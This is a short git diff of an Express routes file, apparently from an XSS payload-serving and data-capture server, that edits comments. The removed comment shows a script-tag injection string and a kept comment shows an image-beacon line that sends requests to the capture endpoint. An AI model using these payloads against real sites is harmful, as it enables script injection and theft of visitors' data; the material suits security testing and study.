@@ -5,8 +5,7 @@ const xss = require('../controllers/xss');
 module.exports = (app) => {
   // Whenever _ body is sent via /m/ POST it will trigger the capture request
   app.post('/m', xss.capture);
-  // Any other request will generate the JavaScript payload
-  // Which will be included in "><script src="site"></script>
+  // Displays the payload
   app.get('/m', xss.displayScript);
   // Captures HTTP interactions for example var x = New Image;x.src='//localhost/mH';
   app.get('/mH', xss.httpGet);
